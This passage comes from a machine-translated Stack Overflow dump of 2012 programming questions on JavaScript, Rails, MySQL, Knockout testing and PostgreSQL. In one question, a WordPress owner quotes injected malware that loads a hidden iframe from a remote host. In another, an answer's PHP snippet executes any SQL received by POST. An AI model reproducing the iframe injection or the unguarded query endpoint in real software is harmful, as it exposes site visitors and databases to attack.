   ProjectType: "Conference"
   StartDate: "Sunday, April 05, 2009"
   Summary: "bla bla"
   __proto__: Object
 1: Object
   EndDate: "Monday, May 09, 2011"
   ProjectId: 1
   ProjectLeader: "Name2 Surname2"
   ProjectName: "B2"
   ProjectOwner: "Corporation2"
   ProjectType: "Programming"
   StartDate: "Sunday, May 09, 2010"
   Summary: "bla bla"
   __proto__: Object
 2: Object
   ...
 3: Object
    ...
 4: Object
    ...
 5: Object
    .... 
```

输出数据应该类似于

```
Object {Corporation1: Array[3], Corporation2: Array[3]}
 Corporation1: Array[2]
   0: A1:  Array[X]
         0: Object
            EndDate: "Monday, May 09, 2011"
            ProjectId: 1
            ProjectLeader: "Name2 Surname2"
            ProjectName: "A1"
            ProjectOwner: "Corporation2"
            ProjectType: "Programming"
            StartDate: "Sunday, May 09, 2010"
            Summary: "bla bla"
         1: Object
            ...
            ...
   1: B2:  Array[X]
         0: Object
            EndDate: "Monday, May 09, 2011"
            ProjectId: 1
            ProjectLeader: "Name2 Surname2"
            ProjectName: "B2"
            ProjectOwner: "Corporation2"
            ProjectType: "Programming"
            StartDate: "Sunday, May 09, 2010"
            Summary: "bla bla"
         1: Object
            ...
            ...
 Corporation2: Array[2]
   0: A1:  Array[X]
         0: Object
            EndDate: "Monday, May 09, 2011"
            ProjectId: 1
            ProjectLeader: "Name2 Surname2"
            ProjectName: "A1"
            ProjectOwner: "Corporation2"
            ProjectType: "Programming"
            StartDate: "Sunday, May 09, 2010"
            Summary: "bla bla"
         1: Object
            ...
            ...
   1: B2:  Array[X]
         0: Object
            EndDate: "Monday, May 09, 2011"
            ProjectId: 1
            ProjectLeader: "Name2 Surname2"
            ProjectName: "B2"
            ProjectOwner: "Corporation2"
            ProjectType: "Programming"
            StartDate: "Sunday, May 09, 2010"
            Summary: "bla bla"
         1: Object
            ...
            ... 
```

树视图应该是两个或多个嵌套节点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:41:20.390

我之前也遇到过类似的情况。我写了一个库来做到这一点：

[https://github.com/raghavv/array-mod](https://github.com/raghavv/array-mod)

请检查一下。我不是在推广我的图书馆，但我认为它符合您的要求。

此外，对于较旧的浏览器支持 IE < 9。您还需要包含另一个优秀的库：

[https://github.com/kriskowal/es5-shim/](https://github.com/kriskowal/es5-shim/)

以下是获取第一组数组的方法：

> a$(gridData).findAll("Corporation1", "ProjectOwner");
> a$(gridData).findAll("Corporation2", "ProjectOwner");
> a$(gridData).findAll("A1", "ProjectName");
> a$(gridData).findAll("B2", "ProjectName");

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-04T01:24:57.307

使用循环计数器根据长度分组：

```
var foo = [57657,57751,58401,58420,58588,58655,59238,59443,59488,59492,59570,59706,59924,59925, 57674, 57687, 57688, 57689, 57693, 57770, 57785, 57786, 57796, 57798, 57810, 57827, 57829, 57835, 57850, 57851, 57852, 57903, 57909, 57910,57957, 57972, 57998, 58022, 58046, 58059, 58064, 58077, 58085, 58097, 58103, 58105, 58127, 58138, 58139, 58220, 58320, 58353, 58356, 58357,58358, 58359, 58360, 58402, 58403, 58404, 58467, 58472, 58473, 58493, 58605]

/* Group into sets of twenty */
var i = 0; while (i <= foo.length) { Math[i] = foo.slice(i, i+20).toString(); i = i + 20; } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-14T11:10:25.347

我想出了这个结果：

```
this.groupBy = function(originalData, aggregation_content) 
    {
        var parentNode,node,i,j,g;
        var newData = {},temp;
        this.array.sortedData = originalData;
        $.each(aggregation_content,function(i,objI){
            $.each(originalData.Items,function(j,objJ){
                node = originalData.Items[j].GetValue(aggregation_content[i].column).replace(/\W+/gi,"");
                if(i > 0)
                {
                    temp = newData;
                    $.each(aggregation_content,function(g,objG){
                        parentNode = originalData.Items[j].GetValue(aggregation_content[g].column).replace(/\W+/gi,"");
                        if(!temp[parentNode])
                        {   
                            temp[parentNode] = [];
                        }
                        temp = temp[parentNode];
                    });
                    temp.push(objJ);
                }
                else
                {
                    if(!newData[node])
                        newData[node] = [];
                }
            });
        });
        console.log(newData);
        return newData;           
    } 
```

我所做的是创建新的树视图（多维）数组，其中填充了指针。所以输出按aggregation_content分组。

# ruby-on-rails - Rails 范围内的顺序不正确

> ID：13845042
> 
> 赞同：0
> 
> 时间：2012-12-12T17:13:13.227
> 
> 标签：ruby-on-rails, activerecord

我不完全理解 Rails 范围的作用。轨道查询：

```
UserDesign.joins(:order_line_items)
     .where('order_line_items.created_at > ?',Date.today-1.month)
     .find(:all,
           :select=>'order_line_items.design_id as id,sum(order_line_items.quantity) as quantity',
           :group=>'order_line_items.design_id',
           :order=>'quantity desc'
     ) 
```

返回项目：

```
 UserDesign Load (0.8ms)  SELECT order_line_items.design_id as id,sum(order_line_items.quantity) as quantity FROM "user_designs" INNER JOIN "order_line_items" ON "order_line_items"."design_id" = "user_designs"."id" WHERE (order_line_items.created_at > '2012-11-12') GROUP BY order_line_items.design_id ORDER BY quantity desc
+-----+----------+
| id  | quantity |
+-----+----------+
| 199 | 65       |
| 196 | 31       |
| 197 | 31       |
| 198 | 30       |
| 204 | 30       |
| 203 | 30       |
+-----+----------+ 
```

这是正确的，但只包括两列。与命名范围相同的查询产生：

```
UserDesign Load (0.7ms)  SELECT order_line_items.design_id as id,sum(order_line_items.quantity) as quantity FROM "user_designs" INNER JOIN "order_line_items" ON "order_line_items"."design_id" = "user_designs"."id" WHERE (order_line_items.created_at > '2012-11-12') GROUP BY order_line_items.design_id ORDER BY quantity desc
UserDesign Load (1.0ms)  SELECT "user_designs".* FROM "user_designs" 
+-----+-------+---
| id  | de... |...
+-----+-------+---
| 196 | aa... |...
| 199 | fd... |...
| 198 | as... |...
| 197 | as... |...
| 203 | Test  |...
| 204 | My... |...
+-----+-------+--- 
```

SQL 查询是相同的并返回所有列，但它们的顺序不正确。我想要么

1.  使用正确排序的命名范围
2.  将普通查询包装在一个函数中，但返回所有列

谢谢！

编辑：

为了完整起见，这里是命名范围：

```
scope :popular_this_month, lambda{
     joins(:order_line_items)
     .where('order_line_items.created_at > ?',Date.today-1.month)
     .find(:all,
           :select=>'order_line_items.design_id as id,sum(order_line_items.quantity) as quantity',
           :group=>'order_line_items.design_id',
           :order=>'quantity desc'
     )} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:51:36.053

值得避免的一件事是将老式`find`语法与较新的`where`et al 混合在一起。

```
scope :popular_this_month, lambda {
  joins(:order_line_items)
    .where('order_line_items.created_at > ?', Date.today - 1.month)
    .select('order_line_items.design_id as id,sum(order_line_items.quantity) as quantity')
    .group('order_line_items.design_id')
    .order('quantity desc')
} 
```

我认为这可能是问题所在。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:50:48.003

在第一种情况下，您传递了一个指定这 2 列的选择选项，因此这两列就是返回的内容。如果您想要更多列，请列出它们（您可以使用 table_name.* 获取表的所有列）

在第二种情况下，您在`find`命名范围内调用，这没有任何意义 - 命名范围只是一组条件和选项，您实际上不应该`find`在那里进行。我怀疑在这种情况下，它会忽略您通过查找的所有选项。

你想要更多的东西

```
scope :popular_this_month, lambda{
     joins(:order_line_items).
     where('order_line_items.created_at > ?',Date.today-1.month).
     select(...).
     order(...).
     group(...)} 
```

这应该导致与第一个示例相同的行为。

# xml - 当我将其设置为 flex 中的属性时，xml 损坏了我的 Base 64 字符串

> ID：13845045
> 
> 赞同：-1
> 
> 时间：2012-12-12T17:13:23.277
> 
> 标签：xml, apache-flex, air, flash-builder

我将图像字节数组转换为`base64`字符串，它成功转换，如果我将它转换回字节数组并分配给任何图像作为源工作正常。

问题，

如果我尝试将相同的`base64`字符串设置为我为保存目的而在本地创建的 XML 的属性，它会在发送到服务器之前干扰或损坏我的 base64 字符串。

有什么帮助吗？

```
var ImageBase64String    :String;
ImageBase64String     = AppUtils.getBase64String(m_oImageContent);
var UpdateUserXML:XML = <UpdateUser />;
UpdateUserXML.@ImageData        = ImageBase64String; 
trace(UpdateUserXML.toString()); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T08:04:47.100

我是这样解决的，

```
public static function getCDATANode(data:String, tagName:String):void
{
        var node:XML  = new XML(  "<" + tagName + "/>" );
        var cdata:XML = new XML("<![CDATA[" + data + " ]]>");
        node.appendChild(cdata);

        trace("getCDATANode: ", node.toXMLString() );
} 
```

# mysql - 简化 MySQL 中的更新/插入（upsert）处理

> ID：13845050
> 
> 赞同：3
> 
> 时间：2012-12-12T17:13:45.090
> 
> 标签：mysql, insert, sql-update, upsert

一个常见的操作是在不存在时插入新行，或者更新现有行。不幸的是，insert 和 update SQL 语句的语法完全不同：Insert 采用列列表，后跟相应的值列表，而 update 采用 column=value 对的列表。MySQL "insert...on duplicate key update" 语句（它的 upsert 语句）不能解决这个问题，因为它仍然需要完整的插入列/值列表，然后是完整的更新列/值列表。[更新：下面 Wrikken 的评论指出，这两个语句可以共享 column=value 语法，但其他问题仍然存在。]

与此问题相关的是，如果您使用触发器来检查数据（就像我一样），则需要两个触发器（插入前和更新前），并且由于它们必须使用“新”限定符，所以您必须编写两次检查代码，每次触发一次，或者将其放入过程中。如果您使用过程，则必须将每一列作为单独的参数传递，因为该过程不能使用“新”，如果您有很多列，这会很容易出错。每列必须在 create table 语句中具有其类型，然后在检查过程的定义中再次具有其类型。一旦出现小错误，您就创建了一个微妙的、难以发现的错误。我不喜欢任何涉及两次对同一事物进行编码的方法。（这相当于非标准化。）

考虑到这个插入/更新问题，我一直在玩弄以下想法，我想要一些反馈，尤其是如果有人真的尝试过的话：

仅对占位符行使用插入，仅保存最少量的数据，并获取或设置主键。然后，将所有用户输入的数据放入更新语句中。现在，您不需要像普通更新那样“插入...重复密钥更新”。此外，您只需要在更新前触发器上检查数据，因为插入时无需检查任何内容。（来自输入表单的所有用户提供的数据都由更新处理，而不是由插入处理。）

当然，这种方法的主要缺点是对新行有两个操作：插入后跟更新，而不是插入。但是，这可能不是一个因素，因为：

1.  插入物可能比较少见。例如，在我几年前为理查森 (德克萨斯) 学区做的学生评分应用程序中，每年只增加了几千名左右的学生，而更新了数以万计的学生，因为教师使用整个学年的系统。

2.  在我构建的其他几个系统中，性能是无关紧要的。例如，我正在使用的当前系统只有两三个人每周只更新几个小时的数据库。负载是如此之小，以至于两个操作（插入+更新）引起的开销（插入+更新）当只有一个就足够时是微不足道的。（这仅适用于新行，请记住。）

那么，有没有人真正尝试过：插入只是为了创建一个极简的占位符行，并对所有用户提供的数据更新使用更新？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T17:50:56.360

如果我需要数据库强制执行数据有效性的“规则”，我仍然需要 INSERT 触发器和 UPDATE 触发器，因为在数据库级别，我无法保证有人不会去执行包含无效数据的 INSERT。无论如何，我倾向于同时拥有这两个触发器。

插入“占位符”行然后更新的另一个缺点是（对于可变长度记录），存在碎片的一个方面。随后的更新几乎可以保证行的长度会增加，这将导致数据库中不必要的碎片增加（如果您只是插入需要的行，则不会发生这种情况。 )

我还需要考虑占位符的 INSERT 成功但 UPDATE 失败的情况。我必须有一些额外的机制来处理这种情况。

运行单个语句会更有效率，只需插入我知道需要存在的值，而不是运行两个单独的语句（一个插入占位符行，然后第二个语句更新它。）

就个人而言，我只会使用`INSERT ... ON DUPLICATE KEY UPDATE`，但不会重复 UPDATE 部分中的值，我只会引用 INSERT 语句中为这些列提供的值，例如

```
INSERT INTO foo (a,b,c) VALUES (1,'one','won'), (2,'two','too')
   ON DUPLICATE KEY
   UPDATE a = VALUES(a)
        , b = VALUES(b)
        , c = VALUES(c) 
```

* * *

注意：要注意此语句的一个副作用，特别是如果它主要是`UPDATE`被执行的。此语句将为尝试插入的每一行增加一个 AUTO_INCREMENT id。该 AUTO_INCREMENT id 值本质上将被“浪费”，因为生成的值不会插入到表中，但它会“消失”。（下一个生成的值会高一个。）

# javascript - Knockout JS 单元测试和 ViewModel 耦合和依赖关系

> ID：13845054
> 
> 赞同：2
> 
> 时间：2012-12-12T17:13:54.497
> 
> 标签：javascript, unit-testing, knockout.js, jasmine, dependency-management

我开始为我的 js 代码编写单元测试，我是这方面的新手。我们使用 knockout.js 并且需要为项目测试我们的视图模型。

这是示例：

**任务.js 文件**

```
var yc = yc || {};

yc.TasksVM = function (options) {
    _addTask = function () {
        yc.AddTask.openDialog();
    },

    _paging = myc.PagingVM();

    _instance = {
        addTask: _addTask,
        paging: _paging,
    };

    return _instance;
} 
```

**和 AddTask.js 文件**

```
var yc = yc || {};

yc.AddTaskVM = function (options) {
    var 
    _openDialog = function (orderId) {
        $.ajax({
            data: data, type: 'get', url: dialogUrl,
            success: function (dialogContent) {
                // ...
            }
        });
    };

    _instance = {
        openDialog: _openDialog
    };

    return _instance;
} 
```

当**我尝试使用 Jasmine 测试 TasksVM 时**，我遇到了需要**实例化** `yc.AddTask.openDialog()`调用的问题`openDialog()`。我还需要将此文件包含在`<script>`标签中才能接听电话。然后，在`yc.AddTask.openDialog`我需要模拟 `$.ajax`调用（并且还包括我的 html 中的 jQuery）。

**我的问题是关于耦合。**

**1.**`yc.AddTask.<my_function>`从里面打电话可以`yc.TasksVM`吗？

在**.NET 世界中，我们通过****接口**处理这个问题。我们去掉所有外部依赖，**只在源代码中使用接口**。所以我们可以在我们正在测试的代码中模拟任何东西。

**2.**我需要将所有这些依赖文件包含到我的 html 文件运行器中吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T08:55:03.123

1）在较小的应用程序中可以，但是对于具有大量耦合的复杂应用程序，我会使用某种 EventAggregator 在模型之间进行通信。

2）当我对我的 JS 业务逻辑进行单元测试时，我总是模拟所有服务和 DOM 交互，您可以通过 KO 免费获得 DOM 交互，因为您只测试已经与 DOM 解耦的 ViewModel（MVVM 的最大优势之一如果你问我）。

jQuery 是一个 DOM 交互库，你应该只使用它的服务部分（post、ajax、getJson 等），所以我为我们的单元测试所做的是覆盖 $ 和 jQuery 符号，所以如果我的任何开发者尝试使用$("dom") 来自 ViewModel 它会在单元测试中崩溃，这是确保所有开发人员都正确使用 KO 的好方法。

在单元测试的设置中，只需覆盖您要模拟的方法（伪代码不是 Jasmine）

```
$.getJSON = function(url, params, success) {
   assert(1, params.id, "It should call our backend with the correct Id");
   success(mockedData);
}; 
```

编辑：在我的项目中，我们使用 Qunit 并有一个基本测试“类”，它有一个拆卸功能，因此它会将所有模拟函数归零，这样就不能从不同的测试中调用它们

# jquery-ui - jQuery UI toggleClass 动画在 Angularjs 中不起作用

> ID：13845058
> 
> 赞同：1
> 
> 时间：2012-12-12T17:14:02.210
> 
> 标签：jquery-ui, angularjs, toggleclass, angular-ui

由于某种原因，持续时间有效，但动画无效。也无法让 Angular-ui ui-animate 工作。

只是先做一个简单的测试调用；

```
$('#event-modal').toggleClass('active', 500); 
```

持续时间有效，但动画无效。

CSS：

```
#event-modal {
    position:absolute;
    top: 20%;
    left: 30%;  
    width:0;
    height:0;
    z-index:1029;
    background:#fff;
    border-radius:5px;
    display:none;
    -webkit-transition: all 0.5s ease;
    -moz-transition: all 0.5s ease;
    -o-transition: all 0.5s ease;
    transition: all 0.5s ease;  
    -webkit-box-shadow: 3px 6px 11px 3px rgba(0,0,0,0.25);
    -moz-box-shadow: 3px 6px 11px 3px rgba(0,0,0,0.25);
    box-shadow: 3px 6px 11px 3px rgba(0,0,0,0.25); 
```

}

```
#event-modal.active { display:block;width:100%; height:100%; } /* Or a hard pixel value */ 
```

确认 jQuery 1.8.2 在 jQuery UI 1.9.1（完整构建）之前被加载，jQuery 被加载到 中`scope`，并且没有重复的脚本调用。

`$scope.$apply()`我打电话后也在做。

如果我尝试使用 angular-ui 进行 ui-animate，它不会将类添加到元素中，再次确认正在以正确的顺序调用脚本。

如果需要，我可以发布更多代码。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-05T05:45:06.973

`display:none`如果你有-> CSS 将不会转换`display:block`

[请参阅此其他 SO 问题](https://stackoverflow.com/questions/3331353/transitions-on-the-display-property)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T23:11:02.303

出于某种原因，jQuery fullCalendar（`clickedEvent`触发我的弹出窗口的原因）设置了一个`visibility: hidden`内联，但除非我手动编辑该元素，否则它不会显示在 Chrome 检查器中。真奇怪。只需要做一个简单的覆盖。

```
#event-modal.active {
    z-index:1029;
    opacity:1;
    width:260px;
    height:489px;
    visibility: visible !important;

    &.full-view {
    width:100%;
    height:100%;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none; 
```

# database - 如何安全地允许我的用户连接到我的数据库？

> ID：13845061
> 
> 赞同：0
> 
> 时间：2012-12-12T17:14:12.773
> 
> 标签：database, security

我创建了一个桌面应用程序，用户可以从他们自己的机器上下载和运行它。此应用程序需要网络访问，并且通常会通过更新、插入等将更改发送到数据库（托管在我的服务器上）。

直接在应用程序中保留密码是不好的，因为如果应用程序被反编译，那么用户可以看到数据库的凭据并自行获得完全访问权限。

在服务器端使用 GET 和 POST 以及 API 是唯一安全的方法吗？还有其他选择吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:23:58.490

所以这里有 2 个问题：1) 验证向您的服务器端 PHP/数据库发布 POST 更新的用户（他们就是他们所说的身份）和 2) 防止您的数据库凭据被暴露。

1) 您是否使用 LDAP 之类的第 3 方集成服务器对用户进行身份验证？

2）服务器凭据不应该存储在应用程序中，因为那里永远不需要它们。一旦你验证了一个用户和他们的请求，你的服务器端 PHP 应该有一个安全功能，它可以解密数据库凭据并根据用户提交的信息发出 SQL 语句。

因此，要回答您的问题，是的，最好的做法是托管一个服务器端框架来处理传入请求，该框架对用户进行身份验证，然后执行他们的请求。

我想如果您希望桌面应用程序能够直接更新数据库（不推荐），您可以存储数据库凭据的加密哈希并使用解密算法进行解密，然后将它们发送到数据库。

```
<?php
    if(isset($_POST['query'])) {
        $query = $_POST['query'];
        $mysqli = new mysqli('localhost', 'my_user', 'my_password', 'my_db');

        //Execute SQL
        if($mysqli->query($query) === TRUE) {
            $mysqli->close();
            echo "successful";
        } else { echo "SQL execution error"; }
    } else { 
        echo "invalid query string"; 
    }
?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:26:24.173

你为什么不建立一个代理网络服务？您的客户端应用程序发送请求，您的网络服务获取它们并在您的数据库上安全地执行它们。

# wordpress - Wordpress hack 注入 javascript / iframe

> ID：13845065
> 
> 赞同：1
> 
> 时间：2012-12-12T17:14:26.173
> 
> 标签：wordpress, virus

我的（Wordpress）网站似乎被黑了，代码被添加到主 index.php 文件、主题 index.php 文件和主题 header.php 文件中。

这部分来自 header.php

```
#f524d6#
<script type=\"text/javascript\" language=\"javascript\" >
(function () {    var kilun = document.createElement('iframe');    kilun.src = 'http://hosting3081247.az.pl/cgi-bin/counter.php';    kilun.style.position = 'absolute';    kilun.style.border = '0';    kilun.style.height = '1px';    kilun.style.width = '1px';    kilun.style.left = '1px';    kilun.style.top = '1px';    if (!document.getElementById('kilun')) {        document.write('<div id=\'kilun\'></div>');        document.getElementById('kilun').appendChild(kilun);    }})();</script>";
#/f524d6# 
```

有人可以告诉我如何删除它吗？它在删除代码行后返回。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T11:28:44.363

如果你在普通的 html/php 页面上找到它——不仅在 wordpress 中——那么它可能是一个解析服务器上所有文件的脚本（即不是 wp hack），在这种情况下最好更改服务器的用户名和密码（以及至于wordpress）：ftp，shell等。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-13T11:26:48.237

*   以最低权限更改您的文件夹和文件。
*   保护您的`.htaccess`.
*   检查文件夹所有权。
*   更改所有密码并创建更难的密码。

# javascript - 在 SQL 查询中使用文本字段值而不提交它

> ID：13845068
> 
> 赞同：0
> 
> 时间：2012-12-12T17:14:41.783
> 
> 标签：javascript, sql, oracle, oracle-apex

我正在使用 Oracle Application Express (Apex)，基本上我的情况是：我有 2 个项目，一个是文本字段，另一个是隐藏项目，其值是通过使用 DB 链接查询表来检索的。

应该发生的情况是用户在文本字段中输入一个数字，然后在查询中使用该数字来查找隐藏项的 ID 与用户输入的数字匹配的行。然后将隐藏项的值设置为该行的其中一列的内容。

唯一的问题是，这一切都在一个页面上，必须在不提交页面的情况下完成，所以当用户在文本字段中输入数字时，我如何将该数字存储为该项目的值，以便它可以用于计算隐藏项值的查询？

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:31:12.717

**更新：**

```
<!DOCTYPE html>
<html>
    <head>
        <script>
            function ajax(user_number) {
                var xmlhttp;
                // get the ID field for easy access... 
                var index =  document.getElementById("index");
                if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari
                    xmlhttp = new XMLHttpRequest();
                } else {// code for IE6, IE5
                    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
                }
                xmlhttp.onreadystatechange = function() {
                    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                        // here you get back a response... xmlhttp.responseText
                        // set the hidden field with new data.
                        index.value = xmlhttp.responseText;
                    }
                }
                // here you make a request to your script to check your database...
                xmlhttp.open("GET", "app/search/?number=" + user_number + '&index=' + index.value, true);
                xmlhttp.send();
            }

            function check(user_number) {
                // make some validation here...
                if (user_number.length > 3) {
                    ajax(user_number);
                } else {
                    return;
                }
            }
        </script>
    </head>
    <body>

        <p>please enter your secret number</p>
        <!-- the hidden field holding the ID -->
        <input type="hidden" id="index" name="index" value="334" />
        <!-- the search text box where user type his own NUMBER onkeyup it make a request -->
        <input type="text" id="user-number" name="user-number" onkeyup="check(this.value);"/>

    </body>
</html> 
```

# javascript - top.location.href 不起作用@Opera

> ID：13845073
> 
> 赞同：0
> 
> 时间：2012-12-12T17:15:09.917
> 
> 标签：javascript, opera

我正在使用这个小导航代码片段

```
<script type="text/javascript">
if(document.location.href.indexOf('.99')>-1)
{
  top.location.href = "http://bit.ly/xxx";
}
else
{
  top.location.href = "http://bit.ly/yyyy";
}
</script> 
```

我的服务器上有 2 个 ip 如果它是 .98 我想导航到 xxx 如果不​​是 yyyy

很简单，因为它适用于所有浏览器而不是 opera

在歌剧中，只有 else { } 部分有效。

如果你想看演示

只需转到该链接：[http ://pastebin.com/raw.php?i=qEyzcG3W](http://pastebin.com/raw.php?i=qEyzcG3W)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:26:42.687

尝试这个：

```
top.location.href = 'http://bit.ly/' + 
                    ( location.href.indexOf( '.99' ) > -1 ? 'xxx' : 'yyy' ); 
```

您正在访问`document.location`对象，而不是全局`location`对象。

# c# - 从 SWF 文件中获取图像

> ID：13845077
> 
> 赞同：0
> 
> 时间：2012-12-12T17:15:29.443
> 
> 标签：c#, .net, flash, webclient

我正在尝试编写一个页面抓取工具来获取页面上的所有图像。除了闪存图像之外，我已经写的内容非常好。

用户粘贴一个链接，我在服务器端抓取页面，然后返回图像。但是，我想要所有的图像，而且通常，高分辨率图像都在闪存中 -[像这样：](http://guessbymarciano.guess.com/en/Catalog/View/Apparel/Tops/Evening/Cecilia%20Beaded%20Tank/P24K1L01000)

但是，由于它是一个 swf 文件，我不知道如何打开它。我找到了几个库，如 FlashTools 和 SWFDotNet，但我都无法从中获得任何乐趣。SWFDotNet 不处理高于 Flash 7 的版本，并且 FlashTools 似乎只告诉我有关该文件的通用数据，我不理解也无法利用这些数据从文件中获取图像。我已经看到了一些对外部 API 的引用，但对于我想要做的事情却一无所获。任何帮助将不胜感激！谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:26:28.073

SWFDotNe 应该为您工作我不知道为什么您在让它工作时遇到问题，但如果您编写了代码，也许发布您迄今为止使用 SWFDotNe 的内容将帮助我们指导您或为您指明正确的方向。也看看这个网站

[如何使用 SwfDotNet 库创建简单的 SWF 反编译器](http://www.codeproject.com/Articles/16834/How-to-create-a-simple-SWF-decompiler-with-the-Swf)

# database - SORT BY RANDOM()：在成为最差解决方案之前，一个表可以容纳多少行？

> ID：13845080
> 
> 赞同：2
> 
> 时间：2012-12-12T17:15:34.653
> 
> 标签：database, performance, postgresql, random

我已经知道通过 random() 排序是检索随机行的最糟糕的方式。我已经实现了添加 random_number 列并在检索随机行时使用该列的解决方案，然后在每次检索时更新 random_number。所有这些都用于参加返回随机代理 IP 的服务：

```
select proxy_ip from proxy where random_number > 0.63 limit 1 
```

0.63 只是应用程序内部生成的随机数的一个示例。

问题是，当我使用“最差”的解决方案时：

```
select proxy_ip from proxy
order by random()
limit 1 
```

调用该服务时，它似乎运行得更快。该表包含 9300 行，所以我的问题是，一个表必须包含多少行才能做出`sort by random()`最坏的解决方案？

应用程序中引入了一些开销，它不能直接与数据库一起使用，而是使用数据层来运行查询，这解释了为什么更好的解决方案运行缓慢（除了它对db，不仅是 1，因为它需要更新 random_number）。

解释分析的结果：

随机排序（）

```
Limit  (cost=837.03..837.03 rows=1 width=18) (actual time=34.954..34.956 rows=1 loops=1)
  ->  Sort  (cost=837.03..860.46 rows=9373 width=18) (actual time=34.950..34.950 rows=1 loops=1)
        Sort Key: (random())
        Sort Method: top-N heapsort  Memory: 25kB
        ->  Seq Scan on proxy  (cost=0.00..790.16 rows=9373 width=18) (actual time=0.013..17.951 rows=9363 loops=1)
Total runtime: 34.993 ms 
```

使用随机列：

```
Limit  (cost=0.00..0.23 rows=1 width=18) (actual time=0.038..0.045 rows=1 loops=1)
  ->  Seq Scan on proxy  (cost=0.00..790.16 rows=3481 width=18) (actual time=0.029..0.029 rows=1 loops=1)
        Filter: (random_number > 0.63::double precision)
Total runtime: 0.078 ms 
```

该表有 1 个索引：

```
CREATE UNIQUE INDEX proxy_pkey ON proxy USING btree (id) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T20:25:17.963

请参阅这篇文章[如何从 postgreSQL 表中检索随机数据行？](https://stackoverflow.com/questions/5472871/how-to-retrieve-randomized-data-rows-from-a-postgresql-table/5473784#5473784)

它链接到一个非常聪明的 Postgres 人 (Depesz) 网站，其中包含大量重要信息。-> [Depesz 我对获得随机行的想法](http://www.depesz.com/index.php/2007/09/16/my-thoughts-on-getting-random-row/)

有了这些信息，尝试一些不同的方法，看看哪种方法效果最好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T08:55:02.917

几个想法...

1.  您的问题的答案将是非常特定于硬件和实现的。9300 行在现代硬件上并不是很多。第一次读取后，您的整个表可能会存储在内存中。所以后续的`ORDER BY RANDOM()`查询会很快。

2.  您还通过不索引该列来损害随机数列的性能，这意味着您仍然必须基本上读取整个表以避免......必须读取整个表。

    因此，为您的 random_number 列添加一个索引，看看它有什么帮助。

3.  您还可以通过执行更新和同时选择来减少必要的往返次数，例如：

    ```
    UPDATE proxy
    FROM (
        SELECT id 
        FROM proxy
        ORDER BY random_number
        LIMIT 1
    ) AS r
    SET random_number=RANDOM()
    WHERE proxy.id=r.id
    RETURNING proxy.* 
    ```

4.  您并没有以这种方式真正随机化您的代理服务器。假设您有 5 台服务器 AE，它们最初分配的 random_numbers 为 1-5：

    ```
    A: 1
    B: 2
    C: 3
    D: 4
    E: 5 
    ```

    在第一次运行时，您将选择服务器 A，其 random_number 为 1。然后为它分配一个新的随机数 1-5。假设你得到 3：

    ```
    B: 2
    C: 3
    A: 3
    D: 4
    E: 5 
    ```

    在第二次运行时，你得到 B，并为其分配一个新的随机数，比如 4：

    ```
    C: 3
    A: 3
    D: 4
    B: 4
    E: 5 
    ```

    然后你得到 C，并给它一个新的随机数，2：

    ```
    C: 2
    A: 3
    D: 4
    B: 4
    E: 5 
    ```

    应该很容易看出您将如何饿死您的一些服务器......任何“不幸”到足以出现在列表末尾的服务器，可能会永远留在那里。

5.  一种更好的，实际上是随机的方法，是在指定范围内为每个服务器分配一个静态数字，然后随机选择*该*数字（或使用哈希伪随机）。这对性能更好，因为您没有进行大量写入，而且它实际上是随机的！

    ```
    SELECT proxy_ip
    FROM proxy 
    WHERE id=(RANDOM()*9300)::INT 
    ```

# sql - 过程或函数“”需要未提供的参数“”

> ID：13845082
> 
> 赞同：3
> 
> 时间：2012-12-12T17:15:39.520
> 
> 标签：sql, sql-server, database, sql-server-2008, stored-procedures

我是 SQL 新手，正在尝试编写存储过程。我在获取默认值作为输出结果时遇到了一些困难。

我有 2 张桌子：

**学生输入**：

```
InputID SectionID  ParameterName    Sequence
------------------------------------------------     
  1     100        FirstName           1 
  2     100        MiddleName          2  
  3     100        LastName            3 
```

**学生输入详细信息**：

```
ParameterName   ParameterValue      DefaultValue
-----------------------------------------------------     
FirstName          John                  1    
FirstName          Troy                  0
FirstName          Mark                  0 
```

我正在尝试调用`ParameterName`from`Student_Input`及其默认值`Student_Input_Details`作为一个表中的输出。我正在尝试以下查询，但出现以下错误：

> *消息 201，级别 16，状态 4，过程 Getparameterdefaultvalues，第 0 行
> 过程或函数“Getparameterdefaultvalues”需要未提供的参数“@ParameterValue”。*

我确定我在这里遗漏了一些重要的东西。

我的查询如下。我正在学习，这可能是一个简单的问题。谢谢........

```
CREATE PROCEDURE Getparameterdefaultvalues
(
    @ParameterName varchar(50) ,
    @ParameterValue varchar(50) OUT
)
AS
BEGIN
    SELECT @ParameterValue = DefaultValue FROM ParameterInput_Values
    WHERE ParameterName=@ParameterName 
END
DECLARE @ParameterValue varchar(50) 
EXEC Getparameterdefaultvalues @ParameterName = 1, @ParameterValue OUTPUT
PRINT 'Result is: ' + @ParameterValue 
```

我需要这样的结果（即`ParameterName`应该只在运行时显示其默认值）：

```
ParameterName   ParameterValue      
---------------------------------- 
FirstName         John 
```

